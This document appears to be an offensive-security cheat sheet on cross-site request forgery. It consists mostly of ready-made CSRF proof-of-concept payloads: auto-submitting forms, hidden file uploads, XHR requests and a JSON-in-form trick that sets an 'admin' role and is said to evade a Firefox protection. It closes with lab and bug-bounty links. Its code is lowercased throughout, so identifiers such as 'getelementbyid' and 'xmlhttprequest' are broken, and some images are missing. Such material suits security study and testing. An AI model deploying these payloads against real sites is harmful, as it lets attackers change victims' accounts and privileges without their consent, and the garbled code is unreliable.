# cross-site request forgery

> cross-site request forgery (csrf/xsrf) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. csrf attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - owasp


## summary

* [tools](#tools)
* [methodology](#methodology)
    * [html get - requiring user interaction](#html-get---requiring-user-interaction)
    * [html get - no user interaction](#html-get---no-user-interaction)
    * [html post - requiring user interaction](#html-post---requiring-user-interaction)
    * [html post - autosubmit - no user interaction](#html-post---autosubmit---no-user-interaction)
    * [html post - multipart/form-data with file upload - requiring user interaction](#html-post---multipartform-data-with-file-upload---requiring-user-interaction)
    * [json get - simple request](#json-get---simple-request)
    * [json post - simple request](#json-post---simple-request)
    * [json post - complex request](#json-post---complex-request)
* [labs](#labs)
* [references](#references)


## tools

* [0xinfection/xsrfprobe](https://github.com/0xinfection/xsrfprobe) - the prime cross site request forgery audit and exploitation toolkit.


## methodology


[image extracted text: [image not found]]


when you are logged in to a certain site, you typically have a session. the identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it.


### html get - requiring user interaction

```html
<a href="http://www.example.com/api/setusername?username=csrfd">click me</a>
```


### html get - no user interaction

```html

[image extracted text: [image not found]]
>
```


### html post - requiring user interaction

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="post">
 <input name="username" type="hidden" value="csrfd" />
 <input type="submit" value="submit request" />
</form>
```


### html post - autosubmit - no user interaction

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="post">
 <input name="username" type="hidden" value="csrfd" />
 <input type="submit" value="submit request" />
</form>
 
<script>
 document.getelementbyid("autosubmit").submit();
</script>
```


### html post - multipart/form-data with file upload - requiring user interaction

```html
<script>
function launch(){
    const dt = new datatransfer();
    const file = new file( [ "csrf-filecontent" ], "csrf-filename" );
    dt.items.add( file );
    document.xss[0].files = dt.files;

    document.xss.submit()
}
</script>

<form style="display: none" name="xss" method="post" action="<target>" enctype="multipart/form-data">
<input id="file" type="file" name="file"/>
<input type="submit" name="" value="" size="0" />
</form>
<button value="button" onclick="launch()">submit request</button>
```


### json get - simple request

```html
<script>
var xhr = new xmlhttprequest();
xhr.open("get", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```


### json post - simple request

with xhr :

```html
<script>
var xhr = new xmlhttprequest();
xhr.open("post", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setrequestheader("content-type", "text/plain");
//you will probably want to also try one or both of these
//xhr.setrequestheader("content-type", "application/x-www-form-urlencoded");
//xhr.setrequestheader("content-type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```

with autosubmit send form, which bypasses certain browser protections such as the standard option of [enhanced tracking protection](https://support.mozilla.org/en-us/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection) in firefox browser :

```html
<form id="csrf_poc" action="www.example.com/api/setrole" enctype="text/plain" method="post">
// this input will send : {"role":admin,"other":"="}
 <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
</form>
<script>
 document.getelementbyid("csrf_poc").submit();
</script>
```

### json post - complex request

```html
<script>
var xhr = new xmlhttprequest();
xhr.open("post", "http://www.example.com/api/setrole");
xhr.withcredentials = true;
xhr.setrequestheader("content-type", "application/json;charset=utf-8");
xhr.send('{"role":admin}');
</script>
```


## labs

* [portswigger - csrf vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)
* [portswigger - csrf where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)
* [portswigger - csrf where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)
* [portswigger - csrf where token is not tied to user session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)
* [portswigger - csrf where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
* [portswigger - csrf where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
* [portswigger - csrf where referer validation depends on header being present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
* [portswigger - csrf with broken referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)


## references

- [cross-site request forgery cheat sheet - alex lauerman - april 3rd, 2016](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
- [cross-site request forgery (csrf) - owasp - apr 19, 2024](https://www.owasp.org/index.php/cross-site_request_forgery_(csrf))
- [messenger.com csrf that show you the steps when you check for csrf - jack whitton - july 26, 2015](https://whitton.io/articles/messenger-site-wide-csrf/)
- [paypal bug bounty: updating the paypal.me profile picture without consent (csrf attack) - florian courtial - 19 july 2016](https://web.archive.org/web/20170607102958/https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/)
- [hacking paypal accounts with one click (patched) - yasser ali - 2014/10/09](https://web.archive.org/web/20141203184956/http://yasserali.com/hacking-paypal-accounts-with-one-click/)
- [add tweet to collection csrf - vijay kumar (indoappsec) - november 21, 2015](https://hackerone.com/reports/100820)
- [facebookmarketingdevelopers.com: proxies, csrf quandry and api fun - phwd - october 16, 2015](http://philippeharewood.com/facebookmarketingdevelopers-com-proxies-csrf-quandry-and-api-fun/)
- [how i hacked your beats account? apple bug bounty - @aaditya_purani - 2016/07/20](https://aadityapurani.com/2016/07/20/how-i-hacked-your-beats-account-apple-bug-bounty/)
- [form post json: json csrf on post heartbeats api - eugene yakovchuk - july 2, 2017](https://hackerone.com/reports/245346)
- [hacking facebook accounts using csrf in oculus-facebook integration - josip franjkovic - january 15th, 2018](https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)
- [cross site request forgery (csrf) - sjoerd langkemper - jan 9, 2019](http://www.sjoerdlangkemper.nl/2019/01/09/csrf/)
- [cross-site request forgery attack - pwnfunction - 5 apr. 2019](https://www.youtube.com/watch?v=eweguchple0)
- [wiping out csrf - joe rozner - oct 17, 2017](https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)
- [bypass referer check logic for csrf - hahwul - oct 11, 2019](https://www.hahwul.com/2019/10/11/bypass-referer-check-logic-for-csrf/)